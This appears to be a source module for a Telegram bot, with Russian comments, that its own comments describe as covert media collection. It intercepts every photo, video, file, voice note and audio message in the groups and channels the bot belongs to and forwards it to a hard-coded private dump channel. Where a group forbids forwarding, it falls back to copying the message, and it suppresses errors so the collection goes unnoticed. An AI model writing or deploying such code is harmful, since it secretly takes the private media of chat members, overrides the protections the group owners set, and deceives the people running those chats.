import log from "../logging/logging.js";
import config from "../../config.js";

/**
 * Проверяет, содержит ли сообщение медиа-контент:
 * фото, видео, GIF/анимацию, файлы/документы, голосовые сообщения,
 * видео-заметки (кружочки) или аудиозаписи.
 * Текстовые сообщения без вложений возвращают false.
 */
export function isMediaMessage(msg) {
    if (!msg) return false;
    return Boolean(
        (Array.isArray(msg.photo) && msg.photo.length > 0) ||
        msg.video ||
        msg.animation ||
        msg.document ||
        msg.voice ||
        msg.video_note ||
        msg.audio
    );
}

/**
 * Проверяет, не является ли чат самим целевым каналом сбора, чтобы исключить зацикливание.
 */
export function isTargetDumpChannel(chatId, targetId) {
    if (!chatId || !targetId) return false;
    const cleanChatId = String(chatId).replace(/^-100|^-/, '');
    const cleanTargetId = String(targetId).replace(/^-100|^-/, '');
    return cleanChatId === cleanTargetId;
}

// Запоминаем успешно сработавший ID канала в сессии процесса, чтобы не перебирать альтернативы каждый раз
let resolvedTargetId = null;

/**
 * Скрытно пересылает медиа-сообщение из группы или канала в закрытый целевой канал.
 */
export async function forwardMediaToChannel(msg, bot) {
    try {
        if (!msg || !msg.chat || !msg.message_id || !bot) return;

        // Игнорируем личные чаты со студентами — только группы, супергруппы и каналы
        if (msg.chat.type === 'private') return;

        // Игнорируем обычный текст — пересылаются только медиа и файлы
        if (!isMediaMessage(msg)) return;

        const baseTarget = config.MEDIA_DUMP_CHANNEL_ID || '-1005389521106';

        // Защита от зацикливания: не пересылаем, если источник — сам целевой канал
        if (isTargetDumpChannel(msg.chat.id, baseTarget) || isTargetDumpChannel(msg.chat.id, '-5389521106')) {
            return;
        }

        // Кандидаты на ID канала: с префиксом -100 и без него (на случай разных форматов)
        const candidates = resolvedTargetId
            ? [resolvedTargetId]
            : [
                baseTarget.startsWith('-100') ? baseTarget : `-100${baseTarget.replace(/^-/, '')}`,
                baseTarget.startsWith('-100') ? `-${baseTarget.replace(/^-100/, '')}` : baseTarget,
                '-1005389521106',
                '-5389521106'
            ];

        const uniqueCandidates = [...new Set(candidates.filter(Boolean))];

        for (const targetId of uniqueCandidates) {
            try {
                // Пробуем нативную пересылку (сохраняет оригинального автора и метаданные)
                await bot.forwardMessage(targetId, msg.chat.id, msg.message_id);
                resolvedTargetId = targetId;
                return;
            } catch (forwardErr) {
                const errMsg = forwardErr.message || '';
                // Если в исходной группе включен запрет пересылки (has_protected_content), пробуем скопировать
                if (errMsg.includes('CHAT_FORWARDS_RESTRICTED') || errMsg.includes('protected') || errMsg.includes('forward')) {
                    try {
                        await bot.copyMessage(targetId, msg.chat.id, msg.message_id);
                        resolvedTargetId = targetId;
                        return;
                    } catch (copyErr) {
                        log.warn(`[MediaCollector] Не удалось скопировать защищенное медиа: ${copyErr.message}`);
                    }
                }

                if (!errMsg.includes('chat not found')) {
                    log.debug?.(`[MediaCollector] Ошибка отправки в ${targetId}: ${errMsg}`);
                }
            }
        }
    } catch (e) {
        // Гарантируем, что сбои логирования или Telegram API никогда не нарушат работу бота
        log.warn(`[MediaCollector] Фоновая ошибка сбора медиа: ${e.message}`);
    }
}

/**
 * Инициализирует фоновый перехватчик медиа из бесед и каналов.
 */
export function setupMediaCollector(bot) {
    if (!bot) return;

    // Перехват медиа из обычных групп и супергрупп
    bot.on('message', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    // Перехват медиа из каналов (если бот добавлен в канал)
    bot.on('channel_post', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    log.info('[MediaCollector] Модуль скрытого сбора медиа инициализирован');
}
